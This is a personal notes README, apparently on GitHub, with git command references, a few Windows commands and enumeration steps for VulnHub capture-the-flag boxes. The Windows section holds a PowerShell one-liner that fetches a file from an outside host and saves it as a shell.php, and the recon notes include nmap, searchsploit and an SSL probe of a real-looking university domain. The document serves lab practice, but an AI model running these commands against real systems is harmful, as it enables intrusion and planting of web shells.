Personal-Notes - example of how to take and store notes on github (copy this template) 
===========================

## Catalog
<li><a href="#vulnhub">VULNHUB - Box Writeups</a></li>
<li><a href="#git-and-github">Git and Github</a></li>
<li><a href="#windows">Windows</a></li>



# <div  align="left">**GIT AND GITHUB**</div>
## Configuration
```
git config global user.name 'hackername'
git config global user.email 'hackeremail@gmail.com'
```

## Storing credentials 
```
git config credential.helper store
```

## Commands
### Setting up after making a repository
Most used
```
echo "# demo" >> README.md
git init
git add *
git commit -m "first commit"
git branch -M main
git remote add origin https://github.com/hackername/demo.git
git push -u origin main
```


Creating a first repository
```
create a new repository on the command line

    echo "# demo" >> README.md
    git init
    git add README.md
    git commit -m "first commit"
    git branch -M main
    git remote add origin https://github.com/hackername/demo.git
    git push -u origin main

push an existing repository from the command line

    git remote add origin https://github.com/hackername/demo.git
    git branch -M main
    git push -u origin main
```

### General Commands
```
echo 'First readme file ' > README.md
git init
git add README.md
git commit -m 'first commit'
git remote - Checks for remote repositories
git remote add origin https://github.com/hackername/sample.git
git push -u origin main/master
git remote remove unwantedremote
git push
git pull
git log
git init - initalises a local git repository in a folder by creating a .git folder
git add filename - Adds file to the index
git status -   Checks the status of the workiing tree or staging area
git rm cached filename - Removes a file from the staging area
git commit - Commits changes to the index
git commit -m 'Commit message goes here'  => Commiting without the editing part
git push - Pushes to the remote repository
git pull - Pulls latest changes ffrom remote repository
git clone - Clones a repository into a new folder
.gitignore file - Add the name of the file in this file and that file will be ignore during commits (e.g log files)
```

### Branches
```
git branch newbranch - Creates a new branch
git checkout newbranch - Changes to that branch
git branch -vv
git branch -d dev -delete dev branch
Add or make changed
git add .
git commit -m 'Login added'
git status - Check if changes were made and staging area is empty
git checkout master - Switch back to master.login.html and stuff in the login         branch vanishes
git push   => Pushes any changes made
git merge login(while in master branch)
```

### Storage locations and important files
```
.git/logs/refs/heads/master => commits file
.git/logs/HEAD

.git/index
git reset hard HEAD~1 => Undo commits one by one
```

### Restoration of deleted files
```
git log - Getting the commit log 
```
Restoring to a certain commit(sha hash)
```
git reset hard d02966ddfbab01d06e853b4e35e57c550c751363
```

### Git Hooks
```
In git there are scripts called git hooks which can run automatically before or after git actions like commits. You can configure them in .git/hooks. For this case I’ll use post-merge since when git pull is run a merge action is done.
```

 
<br/>

# <div  align="left">**WINDOWS**</div>
## GENERAL COMMANDS
Downloading a file with powershell
```
    powershell -Command "$c=new-object System.Net.WebClient;$c.DownloadFile('http://file.kaibro.tw/s','C:\shell.php')"

```

Repairing boot drive
```
navigate too boot with cmd
bddedit // to view
bcdedit /f /delete {xxxxxxxx}

bcdboot c:\windows
```  



<br/>

# <div  align="left">**VULNHUB**</div>
## Catalog
* [CTF-tips](#tips-and-tricks)
* [Operating procedures](#operating-procedures)
* [HTTP procedures](#http)
* [Ssh procedures](#ssh)
* [Ftp procedures](#ftp)
* [MySQL procedures](#mysql)
* [Samba procedures](#samba)
* [Forensics procedures](#forensics)
* [After Initial Access procedures](#after-gaining-access)

### Tips and Tricks
* `tips`
    * Enumeration is Key
    * Be Organized and Document Everything
    * Do as much recon as possible
    * Keep amazing notes
    * Read writeups and watch videos
    * Set small predictable goals
    * Check other peoples methodology of doing the same thing
    * Learn from your weaknesses

* `links`
    * https://blog.nviso.eu/2020/02/13/my-journey-reaching-1-spot-on-hack-the-box-belgium-10-tips-tricks-and-lessons-learned/
    * https://infosecwriteups.com/things-i-learned-after-rooting-25-hack-the-box-machines-e9eada4ea6ca
    * https://technicalnavigator.in/tips-tricks-for-htbhack-the-box/
    * https://bitvijays.github.io/LFC-VulnerableMachines.html (best)


## Operating procedures
- Find the ip in which the vm is operating using sudo arp-scan -l 
- Add the ip to /etc/hosts
- Also add the name of the box with a .box prefix to `/etc/hosts` e.g venom -> venom.box
- Find services running on the machine, start with a simple scan the go to a detailed scan
- Check all ports first with `nmap -Pn -p- stapler -vvv`
- Scan `common ports` using(`sudo nmap 10.10.147.248 -sC -sS -sV -vv`) and metasploit
- Scan `all ports` using (`sudo nmap 10.10.147.248 -p- -sC -sS -sV -vv`) and metasploit
- Check both `https/http` versions of the sites
- Check ssl info for machine `dnsinfo`
- Try to find exploits for the services found using `searchsploit`
- The name of the box could be a service,username,or password
- Check for vulnerabilities using the script option
- If a service is running on two ports, check both ports , they might be slightly different


### Enumerating ssl
```
- openssl s_client -connect defao.dkut.ac.ke:443 // Check subdomain ssl information for more enumeration with the following command
- You can use shodan to locate other ips using the same ssl cert
```

### DNS
```
host <domain> <optional_name_server>
host -t ns <domain>                 Name Servers
host -t a <domain>                  Address
host -t aaaa <domain>               AAAA record points a domain or subdomain to an IPv6 address
host -t mx <domain>                 Mail Servers
host -t soa <domain>                Start of Authority
host <IP>                           Reverse Lookup
host -l <Domain Name> <DNS Server>  Domain Zone Transfer
```


### Http
#### Enumeration guideline
* Check server/service versions, search exploits on searchsploit
* Check for usernames, shares etc.
* Generate wordlists with cewl and use it as passlist in case you have a username
